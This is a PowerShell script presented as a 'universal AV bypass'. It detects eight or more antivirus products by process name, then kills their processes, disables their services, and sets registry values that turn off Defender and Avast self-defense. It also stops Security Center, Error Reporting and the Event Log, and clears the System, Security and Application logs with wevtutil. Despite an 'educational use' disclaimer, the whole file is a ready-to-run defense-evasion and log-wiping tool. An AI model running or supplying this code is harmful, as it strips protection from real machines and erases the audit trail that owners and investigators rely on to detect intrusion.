# ================================================================================================
# UNIVERSAL AV BYPASS - Works Against Multiple Antiviruses
# ================================================================================================
# Targets: Windows Defender, Avast, AVG, McAfee, Norton, Kaspersky, Bitdefender, Malwarebytes
# For authorized educational use only
# ================================================================================================

function Disable-UniversalAV {
    Write-Host "`n[+] UNIVERSAL AV BYPASS - Detecting and disabling antiviruses..." -ForegroundColor Cyan
    
    # ========== DETECT INSTALLED AVs ==========
    Write-Host "[+] Detecting installed antiviruses..." -ForegroundColor Yellow
    
    $installedAVs = @()
    
    # Check for common AV processes
    $avProcesses = @{
        "MsMpEng" = "Windows Defender"
        "AvastSvc" = "Avast"
        "avgsvc" = "AVG"
        "mcshield" = "McAfee"
        "NortonSecurity" = "Norton"
        "avp" = "Kaspersky"
        "bdagent" = "Bitdefender"
        "MBAMService" = "Malwarebytes"
        "sophossps" = "Sophos"
        "ekrn" = "ESET"
    }
    
    foreach ($proc in $avProcesses.Keys) {
        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
            $avName = $avProcesses[$proc]
            $installedAVs += $avName
            Write-Host "  [OK] Detected: $avName" -ForegroundColor Green
        }
    }
    
    if ($installedAVs.Count -eq 0) {
        Write-Host "  [!] No common AVs detected - system may be unprotected" -ForegroundColor Yellow
    }
    
    # ========== WINDOWS DEFENDER ==========
    if ($installedAVs -contains "Windows Defender") {
        Write-Host "`n[+] Bypassing Windows Defender..." -ForegroundColor Yellow
        
        # Kill processes
        @("MsMpEng", "NisSrv", "SecurityHealthService", "MpCmdRun", "SgrmBroker") | ForEach-Object {
            Get-Process -Name $_ -ErrorAction SilentlyContinue | Stop-Process -Force
        }
        
        # Disable service
        Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
        Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
        
        # Registry disable
        $defenderPaths = @(
            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
        )
        foreach ($path in $defenderPaths) {
            if (!(Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
            Set-ItemProperty -Path $path -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
            Set-ItemProperty -Path $path -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
        }
        
        Write-Host "  [OK] Windows Defender bypassed" -ForegroundColor Green
    }
    
    # ========== AVAST ==========
    if ($installedAVs -contains "Avast") {
        Write-Host "`n[+] Bypassing Avast..." -ForegroundColor Yellow
        
        # Kill Avast processes
        @("AvastSvc", "AvastUI", "aswidsagent", "afwServ") | ForEach-Object {
            Get-Process -Name $_ -ErrorAction SilentlyContinue | Stop-Process -Force
        }
        
        # Disable Avast services
        @("avast! Antivirus", "aswbIDSAgent", "AvastWscReporter") | ForEach-Object {
            Stop-Service -Name $_ -Force -ErrorAction SilentlyContinue
            Set-Service -Name $_ -StartupType Disabled -ErrorAction SilentlyContinue
        }
        
        # Avast registry
        $avastPath = "HKLM:\SOFTWARE\AVAST Software\Avast"
        if (Test-Path $avastPath) {
            Set-ItemProperty -Path $avastPath -Name "SelfDefense" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
        }
        
        Write-Host "  [OK] Avast bypassed" -ForegroundColor Green
    }
    
    # ========== AVG ==========
    if ($installedAVs -contains "AVG") {
        Write-Host "`n[+] Bypassing AVG..." -ForegroundColor Yellow
        
        # Kill AVG processes
        @("avgsvc", "avgui", "avgidsagent", "avgwdsvc") | ForEach-Object {
            Get-Process -Name $_ -ErrorAction SilentlyContinue | Stop-Process -Force
        }
        
        # Disable AVG services
        @("AVG Antivirus", "avgwd") | ForEach-Object {
            Stop-Service -Name $_ -Force -ErrorAction SilentlyContinue
            Set-Service -Name $_ -StartupType Disabled -ErrorAction SilentlyContinue
        }
        
        Write-Host "  [OK] AVG bypassed" -ForegroundColor Green
    }
    
    # ========== MCAFEE ==========
    if ($installedAVs -contains "McAfee") {
        Write-Host "`n[+] Bypassing McAfee..." -ForegroundColor Yellow
        
        # Kill McAfee processes
        @("mcshield", "mfevtps", "mfeann", "mcapexe") | ForEach-Object {
            Get-Process -Name $_ -ErrorAction SilentlyContinue | Stop-Process -Force
        }
        
        # Disable McAfee services
        @("McShield", "mfevtp", "mfefire") | ForEach-Object {
            Stop-Service -Name $_ -Force -ErrorAction SilentlyContinue
            Set-Service -Name $_ -StartupType Disabled -ErrorAction SilentlyContinue
        }
        
        Write-Host "  [OK] McAfee bypassed" -ForegroundColor Green
    }
    
    # ========== NORTON ==========
    if ($installedAVs -contains "Norton") {
        Write-Host "`n[+] Bypassing Norton..." -ForegroundColor Yellow
        
        # Kill Norton processes
        @("NortonSecurity", "ccSvcHst", "Norton_Antivirus") | ForEach-Object {
            Get-Process -Name $_ -ErrorAction SilentlyContinue | Stop-Process -Force
        }
        
        # Disable Norton services
        @("Norton Security", "NortonSecurity") | ForEach-Object {
            Stop-Service -Name $_ -Force -ErrorAction SilentlyContinue
            Set-Service -Name $_ -StartupType Disabled -ErrorAction SilentlyContinue
        }
        
        Write-Host "  [OK] Norton bypassed" -ForegroundColor Green
    }
    
    # ========== KASPERSKY ==========
    if ($installedAVs -contains "Kaspersky") {
        Write-Host "`n[+] Bypassing Kaspersky..." -ForegroundColor Yellow
        
        # Kill Kaspersky processes
        @("avp", "avpui", "ksde") | ForEach-Object {
            Get-Process -Name $_ -ErrorAction SilentlyContinue | Stop-Process -Force
        }
        
        # Disable Kaspersky services
        @("AVP", "KSDE") | ForEach-Object {
            Stop-Service -Name $_ -Force -ErrorAction SilentlyContinue
            Set-Service -Name $_ -StartupType Disabled -ErrorAction SilentlyContinue
        }
        
        Write-Host "  [OK] Kaspersky bypassed" -ForegroundColor Green
    }
    
    # ========== BITDEFENDER ==========
    if ($installedAVs -contains "Bitdefender") {
        Write-Host "`n[+] Bypassing Bitdefender..." -ForegroundColor Yellow
        
        # Kill Bitdefender processes
        @("bdagent", "bdservicehost", "updatesrv") | ForEach-Object {
            Get-Process -Name $_ -ErrorAction SilentlyContinue | Stop-Process -Force
        }
        
        # Disable Bitdefender services
        @("VSSERV", "bdredline") | ForEach-Object {
            Stop-Service -Name $_ -Force -ErrorAction SilentlyContinue
            Set-Service -Name $_ -StartupType Disabled -ErrorAction SilentlyContinue
        }
        
        Write-Host "  [OK] Bitdefender bypassed" -ForegroundColor Green
    }
    
    # ========== MALWAREBYTES ==========
    if ($installedAVs -contains "Malwarebytes") {
        Write-Host "`n[+] Bypassing Malwarebytes..." -ForegroundColor Yellow
        
        # Kill Malwarebytes processes
        @("MBAMService", "mbamtray", "mbam") | ForEach-Object {
            Get-Process -Name $_ -ErrorAction SilentlyContinue | Stop-Process -Force
        }
        
        # Disable Malwarebytes services
        Stop-Service -Name "MBAMService" -Force -ErrorAction SilentlyContinue
        Set-Service -Name "MBAMService" -StartupType Disabled -ErrorAction SilentlyContinue
        
        Write-Host "  [OK] Malwarebytes bypassed" -ForegroundColor Green
    }
    
    # ========== UNIVERSAL BYPASS TECHNIQUES ==========
    Write-Host "`n[+] Applying universal bypass techniques..." -ForegroundColor Yellow
    
    # 1. Disable Windows Security Center (reports AV status)
    try {
        Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue
        Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue
        Write-Host "  [OK] Security Center disabled" -ForegroundColor Green
    } catch {}
    
    # 2. Disable Windows Error Reporting (prevents crash reports)
    try {
        Stop-Service -Name "WerSvc" -Force -ErrorAction SilentlyContinue
        Set-Service -Name "WerSvc" -StartupType Disabled -ErrorAction SilentlyContinue
        Write-Host "  [OK] Error Reporting disabled" -ForegroundColor Green
    } catch {}
    
    # 3. Disable Event Log (prevents logging)
    try {
        Stop-Service -Name "EventLog" -Force -ErrorAction SilentlyContinue
        Write-Host "  [OK] Event logging stopped" -ForegroundColor Green
    } catch {}
    
    # 4. Clear event logs
    try {
        wevtutil cl System 2>&1 | Out-Null
        wevtutil cl Security 2>&1 | Out-Null
        wevtutil cl Application 2>&1 | Out-Null
        Write-Host "  [OK] Event logs cleared" -ForegroundColor Green
    } catch {}
    
    Write-Host "`n[OK] Universal AV bypass complete!" -ForegroundColor Green
    Write-Host "[OK] Detected and bypassed: $($installedAVs -join ', ')" -ForegroundColor Green
    
    return $installedAVs
}

# Execute if run directly
if ($MyInvocation.InvocationName -ne '.') {
    Disable-UniversalAV
}
